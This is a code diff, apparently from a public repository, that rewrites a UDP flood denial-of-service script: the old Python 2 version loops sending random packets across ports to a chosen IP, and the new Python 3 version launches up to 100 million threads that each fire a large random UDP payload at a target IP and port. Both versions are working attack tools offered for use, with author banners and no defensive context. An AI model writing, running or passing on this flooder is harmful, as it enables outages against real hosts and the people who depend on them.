@@ -1,51 +1,63 @@
-import sys
-import os
-import time
-import socket
-import random
-#Code Time
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+#!/usr/bin/env python3
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
+import threading, socket, time, random
 
-os.system("clear")
-os.system("figlet DDos Attack")
-print
-print "Author   : Stephin-Franklin"
-print "You Tube : https://www.youtube.com/AnonymousTim3"
-print "github   : https://github.com/Stephin-Franklin"
-print "Facebook : https://www.facebook.com/st1chb45h"
-print
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+__banner__ = """
+ ______       _______ _______ _______ _______ ______  _     _
+ |     \  ___ |_____|    |       |    |_____| |       |____/ 
+ |_____/      |     |    |       |    |     | |_____  |    \_
+ —————————————————————————————————————————————————————————————
+ []xxxxx[]:::::::::::::::::::::> <:::::::::::::::::::[]xxxxx[]
+ |               Author: Stephin-Franklin                    |
+ |           with the contribution of: Paxv28                |
+ []xxxxx[]:::::::::::::::::::::> <:::::::::::::::::::[]xxxxx[]
+"""
 
-os.system("clear")
-os.system("figlet Attack Starting")
-print "[                    ] 0% "
-time.sleep(5)
-print "[=====               ] 25%"
-time.sleep(5)
-print "[==========          ] 50%"
-time.sleep(5)
-print "[===============     ] 75%"
-time.sleep(5)
-print "[====================] 100%"
-time.sleep(3)
-sent = 0
-while True:
-     sock.sendto(bytes, (ip,port))
-     sent = sent + 1
-     port = port + 1
-     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-     if port == 65534:
-       port = 1
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
+class DAttack:
+    def __init__(self, ip, port):
+        self.packet = str(random._urandom(90000)).encode('utf-8')
+
+        self.ip = ip
+        self.port = port
+
+        self.nAttacks = 100000000
+        self.all_threads = []
+
+    def Attack(self):
+        try:
+            s.sendto(self.packet, (self.ip, int(self.port)))
+            print("[ ! ] Attacking... {self.ip} in Port {self.port}")
+        except socket.error:
+            print("[ ! ] No Connection!, Target may be down.")
+            s.close()
+
+        exit(0)
+
+    def SendAttack(self):
+        try:
+            for i in range(1, self.nAttacks):
+                th = threading.Thread(target=self.Attack)
+                th.daemon = True
+                th.start()
+                self.all_threads.append(th)
+
+                time.sleep(0.01)
+            
+            for i in self.all_threads:
+                i.join()
+
+        except RuntimeError:
+            exit(0)
+
+def main():
+    print(__banner__)
+    target = input(" [ * ] Target IP : ")
+    port = input(" [ * ] Target Port : ")
+
+    DAtk = DAttack(target, port)
+    DAtk.SendAttack()
+
+if __name__ == '__main__':
+    main()
